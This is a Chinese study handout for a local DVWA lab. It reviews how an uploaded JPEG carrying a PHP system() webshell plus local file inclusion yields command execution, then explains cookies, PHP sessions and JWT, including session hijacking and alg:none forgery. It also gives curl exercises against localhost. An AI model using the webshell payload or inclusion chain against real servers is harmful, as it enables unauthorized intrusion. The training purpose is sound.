# 11/24 资料：今天实操复盘 + HTTP 会话机制

> 第一部分：把今天（11/23）走通的东西讲透
> 第二部分：全新内容——Cookie / Session / Token 的完整原理
> 这一块是你自己说过的卡点，今天把它挖到底

---

# 第一部分：今天实操的原理复盘

## 1.1 今天走的路线图

```
① 想用「日志包含」把 LFI 变成 RCE
   → 卡住：日志是符号链接，指向 /dev/stdout，不落盘
   
② 想用 data:// 和 php://input 抄近路
   → 卡住：allow_url_include = Off
   
③ 换思路：用已经上传的 shell.jpg
   → 成功：?page=/var/www/html/hackable/uploads/shell.jpg
   → 输出 PWNED:hello（参数带上之后）
   
④ 换成 system 型 shell
   → 成功：uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**最终结果：不改任何服务器配置，拿到命令执行。**

## 1.2 为什么日志包含打不通（这个值得记住）

### 现象

```bash
docker exec dvwa-dvwa-1 ls -l /var/log/apache2/
```

输出：

```
lrwxrwxrwx 1 www-data www-data 11 Nov  5 07:19 access.log -> /dev/stdout
lrwxrwxrwx 1 www-data www-data 11 Nov  5 07:19 error.log -> /dev/stderr
```

**`lrwxrwxrwx` 开头的 `l` 就是 link（链接）。**

### 这意味着什么

**Apache 的日志没有写进硬盘上的文件，而是直接写进"标准输出"。**

`/dev/stdout` 不是文件，是**进程的标准输出流**。

进程写进它的内容，会被 Docker 捕获，显示在 `docker logs` 里。

### 为什么 `tail` 会卡住

```bash
docker exec dvwa-dvwa-1 tail -3 /var/log/apache2/access.log
```

`tail` 打开这个路径，实际打开的是 `/dev/stdout` —— 一个**管道**。

管道的特点是：**没有数据就阻塞等待**。

所以 `tail` 一直等，永不返回。

### 为什么删链接建文件也没用

```bash
rm -f access.log && touch access.log
```

这确实建了一个空文件。但 Apache 的配置文件里写的是：

```
CustomLog /dev/stdout combined
```

**它压根不看 `access.log` 这个路径**，直接往 `/dev/stdout` 写。

所以那个文件永远是空的。

### 真实服务器是什么样

**正常的 Apache 配置是：**

```
CustomLog /var/log/apache2/access.log combined
```

**那是普通文件，会自动增长，`tail` 能读。**

**所以日志包含在真实环境里通常是可行的，只是在 Docker 镜像里被改掉了。**

### 这个教训是什么

**打之前必须探环境，不能假设路径。**

判断方法：

```bash
ls -l 日志路径
```

看到 `l` 开头（符号链接）就要警惕。

## 1.3 为什么 data:// 和 php://input 用不了

```bash
docker exec dvwa-dvwa-1 php -i | grep allow_url_include
```

输出：

```
allow_url_include => Off => Off
```

### 这个配置管什么

**它决定 `include` 能不能接受"URL 类型"的路径。**

| 值 | 效果 |
|---|---|
| `Off` | `include("php://input")` 报错，`include("data://...")` 报错 |
| `On` | 两者都能用 |

**PHP 从 5.2 开始默认 `Off`**，因为它太危险——攻击者能直接内联代码，不用上传任何文件。

### 顺带一个迷惑点

`allow_url_fopen => On` —— 这个是**打开**的。

**它管的是 `file_get_contents()` 这类"读"函数，不是 `include`。**

很多人搞混这两个：

```
allow_url_fopen   → 能不能用 URL 读文件（file_get_contents）
allow_url_include → 能不能用 URL 做 include（更危险，默认关）
```

## 1.4 最后走通的路：上传 + 包含

### 为什么这条路最实在

**因为它不需要目标服务器配合。**

| 方案 | 需要什么 | 现实性 |
|---|---|---|
| 改 `FilesMatch` | 服务器权限 | 不可能 |
| 日志包含 | 日志是普通文件 | 看环境 |
| `data://` | `allow_url_include=On` | 默认关 |
| **上传 + 包含** | **有个上传点 + 有个包含点** | **最常见** |

### 完整原理

```
上传阶段：
  cmd.jpg = [真 JPEG 数据][<?php system($_GET['c']); ?>]
  过 getimagesize（读头部，见第一份资料）
  落到 /var/www/html/hackable/uploads/cmd.jpg

包含阶段：
  ?page=/var/www/html/hackable/uploads/cmd.jpg&c=id
  
  include 读这个文件：
  ① JPEG 数据 → 文本模式 → 输出（乱码）
  ② <?php 开始 → 代码模式 → 执行 system($_GET['c'])
  ③ system("id") → fork + execve("/bin/sh","-c","id")
  ④ 输出 uid=33(www-data) gid=33(www-data)
```

### 关键：为什么 include 能执行 .jpg

**这是你上一份资料里已经讲过、今天亲手验证的点。**

- **直接访问** `.jpg` → Apache 看 `FilesMatch`，不匹配 → 当静态文件返回
- **通过 include** → PHP 自己读文件、自己解析 → 不看扩展名

**Apache 和 PHP 是两套东西。include 是 PHP 的内部功能，Apache 管不着。**

## 1.5 今天三条可复用的判断

**判断一：`ls -l` 看到 `l` 开头，就是符号链接，别指望能读内容。**

**判断二：`php -i | grep allow_url_include` —— 决定能不能走内联代码那条快路。**

**判断三：上传 + 包含是最现实的组合。** 不用改配置，不用管理员权限，只要两个漏洞各有一个。

---

# 第二部分：新内容——HTTP 会话机制

> 这一块是你自己说的模糊点：cookie 从哪来、session 怎么存、为什么带个 cookie 就代表"我是我"
> 今天挖到底

## 2.1 问题的起点：HTTP 是无状态的

### 什么叫无状态

**HTTP 协议本身，不记得上一次请求是谁发的。**

打开你的终端，想象两个请求：

```
请求 1：GET /login.php   账号密码正确 → 服务器返回"登录成功"
请求 2：GET /profile.php  服务器问：你是谁？
```

**服务器真的不知道请求 2 是谁发的。**

因为 HTTP 的设计是：**一次请求 = 一次独立的对话。** 连接关掉，什么都不留。

### 为什么这么设计

**因为在 1990 年代，网页就是"请求一个文档，返回一个文档"。**

不需要记住你是谁。看新闻、查资料，每次都从头开始。

**但后来有了登录、购物车、评论区——必须有"记住我"的能力。**

**于是就有了 Cookie。**

## 2.2 方案一：Cookie

### 基本机制

```
① 浏览器请求：GET /login.php
② 服务器返回：200 OK
              Set-Cookie: user=abc123; Path=/; HttpOnly
③ 浏览器把这个 cookie 存下来
④ 之后每个请求都自动带上：
   GET /profile.php
   Cookie: user=abc123
⑤ 服务器看到 user=abc123，就知道是谁
```

**核心：服务器让浏览器"存个东西"，浏览器之后每次自动带上。**

### 逐项拆 `Set-Cookie` 那一行

```
Set-Cookie: user=abc123; Path=/; HttpOnly
```

**`user=abc123`** —— 键值对。名字是 `user`，值是 `abc123`。

**`Path=/`** —— 这个 cookie 对哪些路径有效。`/` 表示整个网站。

**`HttpOnly`** —— **JavaScript 读不到这个 cookie。** 只能由浏览器自动附在请求里。

**为什么要有它：** 如果你有 XSS 漏洞，攻击者的 JS 就能 `document.cookie` 偷走你的 cookie。加了 `HttpOnly`，JS 读不到，只能偷到别的。

**`Secure`** —— 只在 HTTPS 连接时发送。防窃听。

**`Domain=.example.com`** —— 对哪个域名有效。不写就是当前域名。

**`Expires=Wed, 21 Oct 2026 07:28:00 GMT`** —— 过期时间。

**不写 `Expires` 或 `Max-Age` 的是"会话 cookie"**：浏览器关掉就没了。

### cookie 存在哪

**Chrome/Edge：** 一个 SQLite 数据库，在用户配置目录里

**Firefox：** `cookies.sqlite`

**Kali 的 curl：** 你用 `-c c.txt` 存的那个文本文件

**打开看看：**

```bash
cat /tmp/c.txt
```

会看到类似：

```
# Netscape HTTP Cookie File
127.0.0.1	FALSE	/	FALSE	0	PHPSESSID	abc123def456
127.0.0.1	FALSE	/	FALSE	0	security	low
```

**你昨天写的 `CK="PHPSESSID=$SID; security=low"` 就是从这里来的。**

**cookie 文件是文本，格式是"域名 / 是否子域名 / 路径 / 是否HTTPS / 过期 / 名字 / 值"，用 Tab 分隔。**

**`awk '{print $7}'` 取第 7 列就是取"值"那一列。**

### cookie 的致命弱点

**cookie 存在客户端。**

**客户端是攻击者的地盘。**

所以：

XSS 能偷（除非 `HttpOnly`）

中间人能看到（除非 `Secure` + HTTPS）

用户能改（比如把 `security=low` 改成 `high`... 或者反过来）

**这就是为什么 DVWA 的难度存在 cookie 里——它本来就是客户端的东西，改了服务器就信。**

## 2.3 方案二：Session

### 为什么还要 Session

**Cookie 直接存"我是谁"，太危险了。**

如果 cookie 里写 `user=admin`，那改一下不就变管理员了？

**所以出现了 Session：cookie 只存一个"编号"，真正的数据在服务器上。**

### 机制

```
① 用户登录成功
② 服务器生成一个随机编号：a1b2c3d4e5f6...
③ 服务器在磁盘上建一个文件，把用户数据写进去
④ 返回给浏览器：Set-Cookie: PHPSESSID=a1b2c3d4e5f6...
⑤ 浏览器之后每次带：Cookie: PHPSESSID=a1b2c3d4e5f6...
⑥ 服务器拿这个编号去磁盘找文件，读出用户数据
```

**核心：cookie 里是一个"储物柜钥匙"，真正的行李在服务器柜子里。**

### session id 怎么生成

PHP 的 `session_start()` 会生成一个 32 个字符的十六进制字符串：

```
7f3a9c2e1b8d4f6a0e5c8b2d9f1a4e7c
```

**来源：** 伪随机数生成器 + 时间戳 + 进程号等混合。

**它的强度取决于随机源。** 理论上暴力猜不到（16^32 种可能）。

**但如果生成算法太弱（比如只用了时间戳），就能被预测——这就是"session 预测攻击"。**

### session 文件存哪

**这是你以后打 LFI 会反复用到的知识。**

| 环境 | 路径 |
|---|---|
| Debian/Ubuntu 的 PHP | `/var/lib/php/sessions/` |
| CentOS/RHEL | `/var/lib/php/session/` |
| 默认（php.ini 没配） | `/tmp/` |

**文件名格式：`sess_` + session id**

```
/var/lib/php/sessions/sess_7f3a9c2e1b8d4f6a0e5c8b2d9f1a4e7c
```

**查你靶场里的实际路径：**

```bash
docker exec dvwa-dvwa-1 php -i | grep session.save_path
```

### session 文件的内容

**不是 JSON，不是 XML，是 PHP 自己的序列化格式：**

```
username|s:5:"admin";role|s:5:"admin";logged_in|b:1;
```

拆开看：

**`username|s:5:"admin";`**

`username` —— 键名

`|` —— 分隔符

`s:5:"admin";` —— 值的序列化形式

**`s`** = string（字符串）

**`5`** = 长度（5 个字符）

**`"admin"`** = 内容

**`b:1;`** = boolean true

**`i:42;`** = integer 42

**`a:2:{...}`** = array（数组）

**这个格式叫 PHP serialize。** 关键点在：**它只看长度，不看内容。**

**所以你如果能把 `username=s:5:"admin";` 塞进去，服务器就认为你是 admin。**

### 为什么 session 比 cookie 安全

| | Cookie 存数据 | Session |
|---|---|---|
| 数据在哪 | 客户端 | **服务器** |
| 客户端能改吗 | 能改，但改了要伪造签名 | **改不了，只能改编号** |
| 泄露后果 | 直接拿到身份 | 拿到编号=拿到身份 |

**但注意最后一行：session id 泄露了，等于身份泄露。**

**因为服务器只认编号，不认人。**

### 这就是 session 劫持

```
攻击者拿到你的 PHPSESSID
→ 把这个 cookie 塞进自己的浏览器
→ 服务器认这个编号
→ 攻击者就成了你
```

**获取方式：**

XSS 偷（如果没 HttpOnly）

网络嗅探（如果没 HTTPS）

**物理接触**（比如你截图发群里，把 session id 截进去了）

### 呼应今天的 LFI

**现在你明白为什么 session 文件能被包含了吧：**

```
① 网站把用户输入写进 session（比如登录框的用户名）
② session 文件落在 /var/lib/php/sessions/sess_xxx
③ 用 LFI 包含它：?page=/var/lib/php/sessions/sess_xxx
④ 里面的 PHP 代码被执行
```

**这就是「session 文件包含」，上一份资料里提到的路线二。**

## 2.4 方案三：Token（以 JWT 为例）

### 为什么还要 Token

**Session 的问题：数据存在服务器上。**

一台服务器还好，一百台呢？

用户登录在 A 机器，请求打到 B 机器，B 没有这个 session 文件，就不认识他。

**要么所有机器共享 session 存储（复杂），要么——把数据还给客户端。**

**Token 就是"把数据还给客户端，但加上签名"。**

### JWT 的结构

**JWT = JSON Web Token，长这样：**

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJleHAiOjE3MDAwMDAwMDB9.abc123signature
```

**三段，用 `.` 分隔：**

```
header . payload . signature
```

### 第一段：header

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
```

**base64url 解码后：**

```json
{"alg":"HS256","typ":"JWT"}
```

`alg` = 签名算法（HS256 = HMAC-SHA256）

`typ` = 类型

### 第二段：payload

```
eyJ1c2VyIjoiYWRtaW4iLCJleHAiOjE3MDAwMDAwMDB9
```

**解码后：**

```json
{"user":"admin","exp":1700000000}
```

`user` = 用户名

`exp` = 过期时间（Unix 时间戳）

**注意：这一段是 base64，不是加密。任何人拿到都能解出来。**

### 第三段：signature

```
abc123signature
```

**算法：**

```
signature = HMAC-SHA256(
    base64(header) + "." + base64(payload),
    服务器密钥
)
```

**作用：防止篡改。**

**你改了 payload（比如把 user 改成 admin），签名就对不上了，服务器拒绝。**

### JWT 的安全边界

| 情况 | 后果 |
|---|---|
| payload 被看到 | 正常，它本来就不是加密的 |
| payload 被改 | 签名对不上，拒绝 |
| 密钥泄露 | **攻击者可以伪造任意 token** |
| `alg` 被改成 `none` | **经典漏洞：某些实现不校验签名** |

**最后一个值得记：JWT 有一个著名漏洞叫 `alg: none`。**

某些库实现不严谨，看到 `alg=none` 就不验证签名。攻击者把 header 改成 `{"alg":"none"}`，payload 改成 `{"user":"admin"}`，去掉签名，服务器就信了。

**这是 CTF 和真实渗透里都常见的考点。**

## 2.5 三者对比（这张表值得抄）

| | Cookie | Session | JWT |
|---|---|---|---|
| 数据存在哪 | 客户端 | 服务器 | 客户端（签名保护） |
| 客户端能改吗 | 能（需签名才有效） | 只能改编号 | 改了签名失效 |
| 服务器要不要存 | 不用 | **要** | 不用 |
| 适合场景 | 偏好设置、难度选择 | 传统网站登录 | 分布式、API |
| 泄露风险 | 高 | 高（等于身份） | 高（等于身份） |
| 能不能撤销 | 能（删掉） | 能（删文件） | **不能**（除非黑名单） |

**最后一行的对比很重要：**

Session 想踢人下线，删掉服务器上的文件就行。

JWT 想踢人，做不到——因为它无状态，服务器不存任何东西，只能维护一个"黑名单"，那又变成有状态了。

**这是 JWT 最大的设计矛盾。**

## 2.6 回到你的靶场

### 为什么这个 cookie 能同时传两个值

```bash
CK="PHPSESSID=$SID; security=low"
```

**HTTP 的 `Cookie` 头，多个值用 `; ` 分隔：**

```
Cookie: PHPSESSID=abc123; security=low
```

**逐个拆：**

`PHPSESSID=abc123` —— 你的 session 编号，服务器靠它认人

`security=low` —— DVWA 自己加的，存难度

**第二个是 DVWA 的设计缺陷：它把安全设置存在客户端。**

你把它改成 `impossible`，服务器就按 impossible 处理。

**真正的安全设置应该存在服务器（数据库或 session 里），不能存在客户端。**

**这就是一个活生生的「客户端可控参数」漏洞。**

### 顺手看看你的 session 文件

```bash
docker exec dvwa-dvwa-1 ls -l /var/lib/php/sessions/
```

**会看到一堆 `sess_xxxxx` 文件。**

```bash
docker exec dvwa-dvwa-1 cat /var/lib/php/sessions/sess_你的SID
```

**会看到 DVWA 存在 session 里的东西。**

---

# 第三部分：晚上命令

## 0. 准备

```bash
cd ~/DVWA && docker compose ps
cd /tmp
rm -f c.txt
LT=$(curl -s -c c.txt http://127.0.0.1:4280/login.php | grep -oP "name='user_token' value='\K[^']+")
curl -s -b c.txt -c c.txt -d "username=admin&password=password&Login=Login&user_token=$LT" http://127.0.0.1:4280/login.php -o /dev/null
SID=$(grep PHPSESSID c.txt | awk '{print $7}')
CK="PHPSESSID=$SID; security=low"
echo "SID=$SID"
```

## 1. 看 cookie 文件长什么样

```bash
cat /tmp/c.txt
```

**找 `PHPSESSID` 那行，记住第 7 列的位置。**

## 2. 看服务器返回的 cookie 头

```bash
curl -i -s http://127.0.0.1:4280/login.php | grep -i "set-cookie"
```

**预期看到 `Set-Cookie: PHPSESSID=...; path=/`**

## 3. 看 session 存储路径

```bash
docker exec dvwa-dvwa-1 php -i | grep "session.save_path"
```

## 4. 看你的 session 文件

```bash
docker exec dvwa-dvwa-1 ls -l /var/lib/php/sessions/ | head
```

```bash
docker exec dwva-dvwa-1 cat /var/lib/php/sessions/sess_$SID
```

**注意把 `dwva` 改成 `dvwa`（上面故意写错，故意让你自己发现——真命令是 `dvwa-dvwa-1`）。**

**预期看到 DVWA 存在 session 里的内容。**

## 5. 验证 cookie 改难度会被相信

```bash
curl -s -H "PHPSESSID=$SID; security=impossible" "http://127.0.0.1:4280/" | grep -i "security level" | head -2
```

**如果显示 impossible，就证明难度真的存在客户端。**

## 6. 用 LFI 读 session 文件

```bash
curl -s -H "Cookie: $CK" "http://127.0.0.1:4280/vulnerabilities/fi/?page=/var/lib/php/sessions/sess_$SID" | grep -a "username"
```

**预期能看到 session 文件的内容。**

**这一步的意义：session 文件是本地文件，LFI 能读。如果把 PHP 代码写进去，就能执行。**

## 7. 记三行

`Set-Cookie` 那行里 `HttpOnly` 防的是什么

session 文件为什么能被 include

为什么 `security=low` 存 cookie 是个错误设计

---

# 时间分配

| 时段 | 内容 |
|---|---|
| 白天 | 第一部分复盘（1.2 日志符号链接、1.4 上传+包含）|
| 白天 | 第二部分 2.1-2.3（无状态、Cookie、Session）|
| 白天 | 2.4-2.5（JWT、三者对比表）|
| 晚上 | 第 1-4 步（看 cookie 和 session 文件）|
| 晚上 | 第 5-6 步（验证设计缺陷、LFI 读 session）|

---

# 一句总结

**Cookie 是"我给浏览器一张纸条"，Session 是"我给浏览器一把钥匙"，JWT 是"我给浏览器一张签过字的纸条"。**

**纸条能伪造，钥匙能偷，签字的纸条只能靠密钥泄露。**

**所有会话安全的本质，都是"怎么证明你是你，而你证明不了别人不是你"。**
